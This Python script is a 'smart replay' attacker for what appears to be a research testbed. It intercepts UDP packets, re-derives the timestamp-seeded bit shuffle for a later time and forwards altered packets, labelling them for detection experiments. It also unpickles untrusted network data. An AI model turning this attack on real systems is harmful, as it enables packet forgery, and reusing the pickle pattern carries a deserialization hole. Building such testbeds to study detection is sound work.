#!/usr/bin/env python3
import argparse
import socket
import time
import pickle
import random
import threading

# Length of sequence used by the system
SEQUENCE_LENGTH = 112


def non_negative_float(value):
    """Return a non-negative float for argparse."""
    value = float(value)
    if value < 0:
        raise argparse.ArgumentTypeError("must be greater than or equal to 0")
    return value


def positive_int(value):
    """Return a positive integer for argparse."""
    value = int(value)
    if value <= 0:
        raise argparse.ArgumentTypeError("must be greater than 0")
    return value


def port_number(value):
    """Return a valid TCP/UDP port number for argparse."""
    value = int(value)
    if not 1 <= value <= 65535:
        raise argparse.ArgumentTypeError("must be between 1 and 65535")
    return value


def parse_args():
    parser = argparse.ArgumentParser(
        description=(
            "Replay every Nth intercepted packet after adapting it to the "
            "sequence expected at a later timestamp."
        )
    )
    parser.add_argument(
        "--bind-ip",
        default="0.0.0.0",
        help="local IP address on which to listen (default: %(default)s)",
    )
    parser.add_argument(
        "--listen-port",
        type=port_number,
        default=5005,
        help="local UDP port on which to listen (default: %(default)s)",
    )
    parser.add_argument(
        "--receiver-ip",
        default="192.168.1.12",
        help="destination receiver IP address (default: %(default)s)",
    )
    parser.add_argument(
        "--receiver-port",
        type=port_number,
        default=5005,
        help="destination receiver UDP port (default: %(default)s)",
    )
    parser.add_argument(
        "--delay-s",
        type=non_negative_float,
        default=0.9,
        help="replay delay in seconds (default: %(default)s)",
    )
    parser.add_argument(
        "--replay-every",
        type=positive_int,
        default=20,
        help="replay every Nth intercepted packet (default: %(default)s)",
    )
    return parser.parse_args()


def generate_sequence(seed, length=SEQUENCE_LENGTH):
    """Same sequence generator as sender/receiver."""
    random.seed(seed)
    return [random.randint(1, length) for _ in range(length)]


def shuffle_message(binary_message, sequence):
    """Same shuffling as sender: seed with sum(sequence), shuffle indexed bits."""
    indexed_bits = list(enumerate(binary_message))
    random.seed(sum(sequence))
    random.shuffle(indexed_bits)
    return indexed_bits


def unshuffle_message(shuffled_bits):
    """
    Reverse the shuffling used by the sender.
    Sort by index and re-join bits.
    """
    ordered_bits = sorted(shuffled_bits, key=lambda x: x[0])
    return ''.join(bit for _, bit in ordered_bits)


def smart_delayed_forward(
    orig_packet_data,
    delay_s,
    attacker_socket,
    receiver_ip,
    receiver_port,
):
    """Sleep, then modify the packet to match a later seed and forward it."""
    time.sleep(delay_s)

    packet = orig_packet_data.copy()

    original_timestamp = packet['timestamp']
    original_shuffled = packet['shuffled_bits']
    packet_id = packet.get('ID', None)

    # 1) Reconstruct original binary message from shuffled bits
    binary_message = unshuffle_message(original_shuffled)

    # 2) Choose new timestamp = original_timestamp + delay
    new_timestamp = original_timestamp + delay_s

    # 3) Compute new seed and new sequence
    new_seed = round(new_timestamp)
    new_sequence = generate_sequence(new_seed)

    # 4) Re-shuffle bits using the new sequence
    new_shuffled_bits = shuffle_message(binary_message, new_sequence)

    # 5) Update fields the attacker can change
    packet['timestamp'] = new_timestamp
    packet['sequence'] = new_sequence
    packet['shuffled_bits'] = new_shuffled_bits

    # 6) Ground-truth labels for offline analysis (NOT used by detection)
    packet['AttackType'] = 'smart_replay'
    packet['Original_Timestamp'] = original_timestamp

    # IMPORTANT: signature is NOT changed (attacker has no private key)

    # Serialize and send to receiver
    data_to_send = pickle.dumps(packet)
    attacker_socket.sendto(data_to_send, (receiver_ip, receiver_port))

    print(f"[+] Smart-replayed packet {packet_id} after {delay_s:.3f} s "
          f"(new seed ~ {new_seed})")


def main():
    args = parse_args()

    # Create socket to listen for packets from sender.
    attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    attacker_socket.bind((args.bind_ip, args.listen_port))

    print(
        f"[*] Smart attacker listening on "
        f"{args.bind_ip}:{args.listen_port}..."
    )
    print(
        f"[*] Receiver: {args.receiver_ip}:{args.receiver_port}; "
        f"delay: {args.delay_s:.3f} s; replay every: {args.replay_every}"
    )

    packet_counter = 0
    attacked_ids = []

    try:
        while True:
            data, address = attacker_socket.recvfrom(4096)
            packet_data = pickle.loads(data)
            packet_id = packet_data.get("ID", None)

            packet_counter += 1
            if packet_counter % args.replay_every == 0:
                print(f"[+] Intercepted packet {packet_id} from {address}")

                attacked_ids.append(packet_id)
                print(f"[*] Scheduling smart replay for packet {packet_id}...")
                thread = threading.Thread(
                    target=smart_delayed_forward,
                    args=(
                        packet_data,
                        args.delay_s,
                        attacker_socket,
                        args.receiver_ip,
                        args.receiver_port,
                    ),
                    daemon=True,
                )
                thread.start()

    except KeyboardInterrupt:
        print("\n[!] Smart attacker stopped.")
        print("Attacked packet IDs:", attacked_ids)
    finally:
        attacker_socket.close()


if __name__ == "__main__":
    main()
